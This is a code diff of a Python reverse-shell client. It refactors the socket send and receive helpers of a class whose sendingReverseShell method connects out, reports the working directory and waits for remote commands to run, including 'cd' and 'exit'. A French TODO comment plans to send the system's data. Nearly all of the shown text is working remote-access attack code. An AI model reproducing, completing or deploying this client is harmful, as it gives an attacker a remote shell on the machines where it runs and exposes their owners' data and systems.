@@ -15,13 +15,18 @@ class Client():
     def __init__(self):
         pass
 
-    def encode(self, data):
-        # return json.dumps(data).encode("UTF-8")
-        return bytes(json.dumps(data), "UTF-8")
+    def _sending(self, s, data):
+        return s.send(bytes(json.dumps(data), "UTF-8"))
          
     
-    def decode(self, data):
-        return json.loads(data.decode("UTF-8"))
+    def _receiving(self, s):
+        data = ""
+        while True:
+            try:
+                data += s.recv(1024).decode("UTF-8").strip()
+                return json.loads(data)
+            except ValueError:
+                continue
         
 
     def sendingData(self):
@@ -33,14 +38,15 @@ class Client():
         s.connect((host, port))
         data = {}
 
+        # TODO envoi les données du système changer la fonction
         while True:
             data["message"] = input('> ')
             if data["message"].lower() == "exit":
-                s.send(self.encode(data))
+                self._sending(s, data)
                 s.close
                 break
 
-            s.send(self.encode(data))
+            self._sending(s, data)
 
     
     def sendingReverseShell(self):
@@ -56,15 +62,15 @@ class Client():
         while not quitting:
             data["cwd"] = os.getcwd()
 
-            s.send(self.encode(data))
+            self._sending(s, data)
 
             # Waiting for a command
-            data = self.decode(s.recv(1024))
+            data = self._receiving(s)
             commandArgs = data["command"].split()
 
             if data["command"].lower() == "exit":
                 quitting = True
-                s.send(self.encode(data))
+                self._sending(s, data)
                 s.close()
             if commandArgs[0].lower() == "cd":
                 try:
